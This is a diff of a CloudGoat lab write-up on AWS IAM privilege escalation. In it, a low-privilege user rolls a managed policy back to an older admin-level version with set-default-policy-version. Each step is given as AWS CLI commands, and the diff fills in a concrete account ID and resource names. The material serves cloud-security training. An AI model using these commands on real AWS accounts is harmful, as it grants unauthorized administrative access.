@@ -9,8 +9,6 @@
 AWS IAM policies keep a version history — up to 5 versions per managed policy. Only one version is "active" (the default) at any time, but older versions are **not automatically deleted**. If an old version was ever more permissive than the current one (for example, left over from testing), and a user holds the narrow `iam:SetDefaultPolicyVersion` permission, they can simply switch the policy back to that old, more permissive version — instantly escalating their own privileges without ever editing the policy's content.
 
 This scenario simulates exactly that: a low-privilege IAM user ("Raynor") whose current policy looks harmless, but who can roll back to a forgotten admin-level version.
-
-## Attack chain
 ## Screenshots
 
 ![Policy versions](./screenshots/rollback_1_versions.png)
@@ -30,17 +28,17 @@ This scenario simulates exactly that: a low-privilege IAM user ("Raynor") whose 
 ### 1. Enumerate Raynor's current permissions
 
 ```bash
-aws iam list-attached-user-policies --user-name raynor-xxxx --profile raynor
-aws iam list-user-policies --user-name raynor-xxxx --profile raynor
+aws iam list-attached-user-policies --user-name raynor-cgidl7bnp43pty --profile raynor
+aws iam list-user-policies --user-name raynor-cgidl7bnp43pty --profile raynor
 ```
 
-Raynor has one managed policy attached: `cg-raynor-policy-xxxx`.
+Raynor has one managed policy attached: `cg-raynor-policy-cgidl7bnp43pty`.
 
 ### 2. Check the policy's version history
 
 ```bash
-aws iam get-policy --policy-arn arn:aws:iam::<account-id>:policy/cg-raynor-policy-xxxx --profile raynor
-aws iam list-policy-versions --policy-arn arn:aws:iam::<account-id>:policy/cg-raynor-policy-xxxx --profile raynor
+aws iam get-policy --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor
+aws iam list-policy-versions --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor
 ```
 
 Result: the policy has 5 versions (v1–v5). Oddly, **v1 — the oldest — is the active/default version**, while v2 through v5 exist but are unused. That's a red flag: normally the newest version would be active.
@@ -48,7 +46,7 @@ Result: the policy has 5 versions (v1–v5). Oddly, **v1 — the oldest — is t
 ### 3. Inspect every version's actual permissions
 
 ```bash
-aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile raynor
+aws iam get-policy-version --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --version-id v1 --profile raynor
 # ...repeated for v2, v3, v4, v5
 ```
 
@@ -65,7 +63,7 @@ The root cause: v1 grants `iam:SetDefaultPolicyVersion` — a permission that so
 ### 4. Escalate — roll back to the admin version
 
 ```bash
-aws iam set-default-policy-version --policy-arn <arn> --version-id v3 --profile raynor
+aws iam set-default-policy-version --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --version-id v3 --profile raynor
 ```
 
 This switches the policy's active version to v3 (full admin) using only the narrow `SetDefaultPolicyVersion` permission — no policy edit permission was ever needed.
@@ -73,7 +71,7 @@ This switches the policy's active version to v3 (full admin) using only the narr
 ### 5. Verify escalation
 
 ```bash
-aws iam get-policy --policy-arn <arn> --profile raynor   # DefaultVersionId now "v3"
+aws iam get-policy --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor   # DefaultVersionId now "v3"
 aws s3 ls --profile raynor                                 # succeeds — previously would have been denied
 aws ec2 describe-instances --profile raynor                # succeeds — full account visibility
 ```
@@ -88,7 +86,7 @@ cloudgoat destroy iam_privesc_by_rollback
 
 Verified teardown with:
 ```bash
-aws iam get-user --user-name raynor-xxxx --profile cloudgoat   # NoSuchEntity
+aws iam get-user --user-name raynor-cgidl7bnp43pty --profile cloudgoat   # NoSuchEntity
 ```
 
 ## Root cause
